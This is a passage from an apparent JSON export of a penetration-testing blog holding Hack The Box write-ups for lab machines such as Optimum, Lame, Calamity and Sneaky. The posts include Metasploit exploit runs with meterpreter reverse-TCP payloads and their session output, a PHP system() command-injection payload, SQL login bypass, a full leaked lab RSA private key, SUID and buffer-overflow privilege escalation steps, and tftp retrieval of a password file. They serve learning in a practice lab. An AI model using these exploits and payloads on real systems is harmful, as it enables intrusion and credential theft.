      "content": "<p>This was so simple really,</p>\n\n<p>&nbsp;</p>\n\n<p>In first place like always I navigate to /dev/shm/ then upload linux_privesc.py</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-205445.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-205445.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>unfortunately I was facing a lots problems with the interpreter for the environment variable.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-210847.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-210847.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>so instead of spend time with how to solve all the small issues,</p>\n\n<p>I went with the command:</p>\n\n<p>find / -perm -4000 2&gt;/dev/null</p>\n\n<p>I have been using this command during&nbsp; few earlier boxes I have read about it though I cant find a good explaination of it so please read on your own about it =).</p>\n\n<p>&nbsp;</p>\n\n<p>the I found following path very interesting:</p>\n\n<p>/var/htb/bin/emergency</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-210847.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-210847.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>I navigated to the path also run the program nothing happened,</p>\n\n<p>then i typed &quot;id&quot; returned --&gt;</p>\n\n<p>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)</p>\n\n<p>then I wanted to verify if I got even more access for my current user or if I am someone else by whoami</p>\n\n<p>root</p>\n\n<p>voila</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-210933.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-210933.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>This was very simple but fun.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.29",
      "title": "Bank root flag [Hack the box] - [Blog]  ",
      "published": {
        "seconds": 1577132322,
        "nanoseconds": 62000000
      },
      "author": "XsiSec none",
      "authorId": "mbuFF18MjcWngUNEQLShmrWXyc23"
    },
    "VOzNu8IuD8t4ou0gBGmS": {
      "title": "Optimum  - User Flag [Hack the box] ",
      "published": {
        "seconds": 1555418813,
        "nanoseconds": 227000000
      },
      
      "author": "XsiSec",
      "levels": [
        "Easy"
      ],
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2Foptimum.png?alt=media&token=88356e3c-fe98-4df1-a26e-ff44e9c6fb61",
      "os": [
        "Linux"
      ],
      "content": "<p>this was the most buggy box so far,</p>\n\n<p>The target machine is running HttpFileserver 2.3 for which there is a public exploit available.&nbsp;</p>\n\n<p>dnsrecon -n 10.10.10.8 -r 10.10.10.0/24</p>\n\n<p>xsisec@d0m:~# nmap -sS -Pn -sV 10.10.10.8 Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-30 22:29 +08 Nmap scan report for 10.10.10.8 Host is up (0.38s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.11 seconds</p>\n\n<p>The HttpFileServer version found by nmap.</p>\n\n<p>xsisec@d0m:~# nmap -Pn -p 80 --script http-enum 10.10.10.8 Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-30 23:00 +08 Nmap scan report for 10.10.10.8 Host is up (0.40s latency). PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 126.34 seconds</p>\n\n<p>xsisec@d0m:~# searchsploit HTTP File Server 2.3</p>\n\n<p>---------------------------------------------------------- ---------------------------------- Exploit Title | Path | (/usr/share/exploitdb/platforms/) ---------------------------------------------------------- ---------------------------------- Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File U | multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Exe | windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Exe | windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Co | windows/webapps/34852.txt ---------------------------------------------------------- ----------------------------------</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>msf &gt; use exploit/windows/http/rejetto_hfs_exec&nbsp;<br />\nmsf exploit(rejetto_hfs_exec) &gt; set RHOST 10.10.10.8&nbsp;<br />\nRHOST =&gt; 10.10.10.8&nbsp;<br />\nmsf exploit(rejetto_hfs_exec) &gt; set payload windows/x64/meterpreter/reverse_tcp&nbsp;<br />\npayload =&gt; windows/x64/meterpreter/reverse_tcp&nbsp;<br />\nmsf exploit(rejetto_hfs_exec) &gt; set LHOST 10.10.*.*&nbsp;<br />\nLHOST =&gt; 10.10.*.*&nbsp;<br />\nmsf exploit(rejetto_hfs_exec) &gt; set LPORT 4455&nbsp;<br />\nLPORT =&gt; 4455&nbsp;<br />\nmsf exploit(rejetto_hfs_exec) &gt; exploit</p>\n\n<p>&nbsp;</p>\n\n<p>[*]&nbsp;Started reverse TCP handler on 10.10.*.*:4455&nbsp;<br />\n[*]&nbsp;Using URL: http://0.0.0.0:800/aPrzG0R5eKWK&nbsp;<br />\n[*]&nbsp;Local IP: http://192.168.140.136:800/aPrzG0R5eKWK&nbsp;<br />\n[*]&nbsp;Server started.&nbsp;<br />\n[*]&nbsp;Sending a malicious request to /&nbsp;<br />\n[*]&nbsp;Payload request received: /aPrzG0R5eKWK&nbsp;<br />\n[*]&nbsp;Sending stage (1189423 bytes) to 10.10.10.8&nbsp;<br />\n[*]&nbsp;Meterpreter session 1 opened (10.10.*.*:4455 -&gt; 10.10.10.8:49162) at 2017-12-19 16:18:59 -0500&nbsp;<br />\n[!]&nbsp;Tried to delete %TEMP%\\mbSzL.vbs, unknown result&nbsp;<br />\n[*]&nbsp;Server stopped.</p>\n\n<p>meterpreter &gt; getuid&nbsp;<br />\nServer username:&nbsp;OPTIMUM\\kostas&nbsp;<br />\nmeterpreter &gt; sysinfo&nbsp;<br />\nComputer : OPTIMUM&nbsp;<br />\nOS : Windows 2012 R2 (Build 9600).&nbsp;<br />\nArchitecture : x64&nbsp;<br />\nSystem Language : el_GR&nbsp;<br />\nDomain : HTB&nbsp;<br />\nLogged On Users : 1&nbsp;<br />\nMeterpreter : x64/windows&nbsp;<br />\nmeterpreter &gt;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.8"
    },
    "VrOPBNbdL0k8CZJZxulm": {
      "author": "XsiSec",
      
      "image": "https://firebasestorage.googleapis.com/v0/b/xsisec-com.appspot.com/o/posts%2FScreenshot%20from%202019-03-11%2017-19-04.png?alt=media&token=2e055502-35e6-40b9-9004-944c7a1b5116",
      "content": "I know nmap since many years back though now I really want to know each of the flags in deep:<br>I have use:<br>nmap -p 1-65535 -sV -T4 10.10.10.3:<br><br>-p (Range 1 to 65535)<br>-sV&nbsp; (Probe open ports to determine service/version info)<br>-T (Set timing template - higher is faster (less accurate))<br><br>From the Nmap scan we got to know that it is using vulnerable ftp service version vsftpd 2.3.4 and the port it is using is also open.<br><br><br>searchsploit vsftpd 2.3.4<br><br>exploit/unix/ftp/vsftpd_234_backdoor<br><br><br><br><br>To execute this exploit, we used simple Metasploit commands<br><br>use exploit/unix/vsftpd_234_backdoor<br><br>show options&nbsp; // to see the options available for this exploit<br><br>set RHOST ipaddress<br><br>exploit<br><br>After trying this exploit quite a few times, we didn’t find anything useful hence we tried to look for other vulnerable software in the box, we did find the samba version vulnerable hence we checked that samba version for exploits in searchsploit.<br><br>Command:<br><br>searchsploit 3.0.20<br><br>We find some suggestions for exploits, we choose the one which is with Metasploit framework, we used<br><br>exploit/multi/samba/usermap_script<br><br>We used simple Metasploit commands to run this exploit,<br><br>use exploit/multi/samba/usermap_script<br><br>show options<br><br>set RHOST ipaddress<br><br>exploit<br><br>after a few seconds, we got our shell from where we find our flag in a text file called root.txt.<br><br><br>",
      "title": " Owned the box \"Lame\" user and root  [Hack the box]",
      "published": {
        "seconds": 1552324810,
        "nanoseconds": 926000000
      }
    },
    "WJ7mk1azvBLLmb12qxUT": {
      "content": "<p>I have had some break from the penetration-testing over christmas and new eve,</p>\n\n<p>&nbsp;</p>\n\n<p>so I decided since I started to work again to get on track again.</p>\n\n<p>&nbsp;</p>\n\n<p>unfortunately for this box I did this in several steps so I am not able to replicate all the images during the procedure.</p>\n\n<p>&nbsp;</p>\n\n<p>Anyway I started up as usual with an inital nmap scan:shut</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-183826.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-183826.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>Didnt found any special besides the ssh server like almost all hack the boxes contains...</p>\n\n<p>&nbsp;</p>\n\n<p>the page itself didnt told much not even any robots.txt or anything such &quot;xx/admin&quot; etc. (I was exploratory testing during the gobuster scan).</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184213.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184213.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184435.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184435.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I have been using more and more&nbsp; gobuster scan to be able easier even hopefully not needs of use &quot;grep&quot; anymore, so I can sort the http-codes based on example 200 =OK.</p>\n\n<p><br />\nI did another scan with nikto and found some interesting entries:</p>\n\n<p>+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users:</p>\n\n<p>&nbsp;</p>\n\n<p>when I navigated to the page I there was a input field:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184815.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184815.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>then I just started to tamper the request towards the server and when I did some elaborating I came over a commented password for the login page:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184918.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-184918.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>when I had the password I was trying some usernames like admin,administrator, root etc I dont rember which of those was the key but somehow I could login then I knew since earlier boxes .. exactly what I should try code execution I started to setup a simple http server through server like usual also testing some php commands example:</p>\n\n<p>&lt;?php system(&#39;ls -la&#39;)?&gt;</p>\n\n<p>&nbsp;</p>\n\n<p>then I got hade some success</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-185141.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-185141.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>since I was lazy I just navigated to the manually to the user flag.</p>\n\n<p>&nbsp;</p>\n\n<p>I did several atemps through msfvenom shells also pentest shells but the session was automatically killed once I was connected</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-185304.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200108-185304.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>so I decided not to do futher investigations I will instead do that when I trying to get the root flag.</p>\n\n<p>&nbsp;</p>\n\n<p>regardless flag found!</p>\n\n<p>&nbsp;</p>\n\n<p>enjoy...</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.27",
      "title": "Calamity user flag [Hack the box] - [Blog]  ",
      "published": {
        "seconds": 1578506059,
        "nanoseconds": 462000000
      },
      "author": "XsiSec",
      
      "levels": [
        "Beginner"
      ],
      "image": null,
      "os": [
        "Linux"
      ]
    },
    "aPoFoJle2aDUOYbzKS9I": {
      "content": "<p>The way of solve this box was really new to me, I have never tried before to use.</p>\n\n<p>First step was like always:nmap -sC -sV -oA nmap 10.10.10.20</p>\n\n<p>Only port 80 was open.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-153616.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-153616.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>the webpage doesn&#39;t display much at all:</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-153420.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-153420.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>nothing in http://10.10.10.20/robots.txt (not found)</p>\n\n<p>&nbsp;</p>\n\n<p>I was running like usual dirbuster against the box:</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-153920.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-153920.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>The most interesting piece here was&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>http://10.10.10.20/dev</p>\n\n<p>&nbsp;</p>\n\n<p>It was a login page I first tried some manual usernames and passwords but I tampered the request into burp</p>\n\n<p>I sent it to intruder voila:</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-154208.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-154208.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>I had a lots of sql-combinations that was working (status 200):</p>\n\n<p>&nbsp;</p>\n\n<p>I could download a key from the site:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-154659.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-154659.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>-----BEGIN RSA PRIVATE KEY-----<br />\nMIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5<br />\nLc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr<br />\n3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb<br />\nyDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn<br />\ncb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj<br />\noOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa<br />\nNyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR<br />\nh6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC<br />\nCphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT<br />\nOtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a<br />\nI0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB<br />\nJkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz<br />\n5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY<br />\nChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym<br />\n+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu<br />\n7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC<br />\nGR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne<br />\naK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J<br />\nVnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x<br />\nhxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd<br />\n1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ<br />\nLJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG<br />\nUkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/<br />\nHu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31<br />\nrOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb<br />\n-----END RSA PRIVATE KEY-----<br />\n&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>so i thought I could use this when I tried to remote the server with ssh.</p>\n\n<p>&nbsp;</p>\n\n<p>though I was completetly stuck I didnt know the usernames for ssh</p>\n\n<p>&nbsp;</p>\n\n<p>Since the target was not running any ssh servcice we used &nbsp;metasploit to enumerate the SNMP protocal to gain more information:</p>\n\n<p>&nbsp;</p>\n\n<p>msf &gt; use auxiliary/scanner/snmp/snmp_enum<br />\nmsf auxiliary(scanner/snmp/snmp_enum) &gt; set rhosts 10.10.10.20<br />\nmsf auxiliary(scanner/snmp/snmp_enum) &gt; set threads 5<br />\nmsf auxiliary(scanner/snmp/snmp_enum) &gt; exploit</p>\n\n<p>&nbsp;</p>\n\n<p>After enumerating the target machine we find that maybe ssh is running in ipv6.</p>\n\n<p>I found a script called &quot;Enyx&quot;,&nbsp;to find the ipv6 address of the target machine. You can get the script from this&nbsp;link.</p>\n\n<p>python enyx.py 2c public 10.10.10.20</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-155526.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-155526.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>After finding the ipv6 address of the target machine we login through ssh using the username and RSA Private key that we find after we login on the /dev/ page.</p>\n\n<p>&nbsp;</p>\n\n<p>ssh -i key thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:b88c</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-155934.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-155934.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>next step was to try to find files with suid bit set(temporary write access)</p>\n\n<p>find / -perm -4000 2&gt;/dev/null</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-160128.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-160128.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&quot;/usr/local/bin/chal&quot;, this entry looked a little bit suspicious:</p>\n\n<p>since my pattern_create.rb did not work I used following site to generate a pattern:</p>\n\n<p><a href=\"https://wiremask.eu/tools/buffer-overflow-pattern-generator/\">https://wiremask.eu/tools/buffer-overflow-pattern-generator/</a></p>\n\n<p>We find a binary file called chal in /usr/local/bin we open it in gdb and find there is a strcpy function<br />\n(gdb) set disassembly-flavor intel<br />\n(gdb) disas main</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-160537.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-160537.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>We check the size that is required to completely overwrite the return address by checking the location of the string that became the return address inside the pattern that we created. We use pattern offset tool to check the corresponding location.<br />\nvoila segmentation fault:</p>\n\n<p>0x316d4130 in ?? ()<br />\n&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-160701.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-160701.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>We find that after 362 bytes the return address gets overwritten. Now we take a look at the stack to find a location for nop sled and shell code.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-162550.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-162550.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Finally got shell&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-165828.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20191005-165828.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.20",
      "title": "Sneaky  [Hack the box]  - [Blog]",
      "published": {
        "seconds": 1570282988,
        "nanoseconds": 481000000
      },
      "author": "XsiSec",
      
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Linux"
      ]
    },
    "bqz0Bq25NB3iX2pHiCDa": {
      "levels": [
        "Very Hard"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>this is definitely the most diffcult box I made so far.</p>\n\n<p>I learned a lots of things</p>\n\n<p>the importance of set correct priveleges of folders even when uses wildcards.</p>\n\n<p>&nbsp;</p>\n\n<p><em>sudo nmap -A 10.10.10.21<br />\nnmap -sC -sC -oA nmap 10.10.10.21<br />\nnmap -sU -oA udp 10.10.10.21 (slow men bra)</em></p>\n\n<p>&nbsp;</p>\n\n<p>I found</p>\n\n<p>two things</p>\n\n<ul>\n\t<li>OPEN SSH</li>\n\t<li>Http-proxy</li>\n</ul>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-180706.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-180706.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>since I have never done things like this I know how I would like to the set-up to be able to run scans agains tthe target the challange really was to figure it out.</p>\n\n<p>after a while since the scans gave me less result I checked some walkthrough but I tried a lots before since I wanted to learn as much as possible.</p>\n\n<p>I still am a bit frustated how people get to a point in this case.</p>\n\n<p>I couldn&#39;t find any port that was using the <em>tftp</em></p>\n\n<p>so after I while i checked some walkthrough now I understand how important its to have a brief understanding of the nmap flags even more than before.</p>\n\n<p>I ended up with:</p>\n\n<p><em>nmap -sU -oA udp 10.10.10.21</em></p>\n\n<p>that gave me a lots of result:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-181332.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-181332.png\" style=\"height:276px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then i read about tftp since I was able to connect to the target I really wanted to find out if there is any<em> &#39;dir&#39; </em>command do list files but it wasnt not.</p>\n\n<p>I used mostly the basic command <em>&#39;get&#39; </em></p>\n\n<p><em>get /etc/squid/squid.conf&nbsp; </em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-181621.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-181621.png\" style=\"height:203px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>to strip the config file with the &#39;#&#39; and blank space I used</p>\n\n<p><em>cat squid.conf | grep -v ^\\#| grep .</em></p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-181940.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-181940.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then we found a interesting path:</p>\n\n<p><em>auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords</em></p>\n\n<p>I could download the file.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-182130.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-182130.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then it was a kind of -learn basic of find out which type of hash it was.</p>\n\n<p>I found following sources very useful:</p>\n\n<p><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>\n\n<p>@ippsec was using the 4 first characters of the string and did a search</p>\n\n<p><em>&#39;$apr&#39;</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-182501.png\" target=\"_blank\"><img 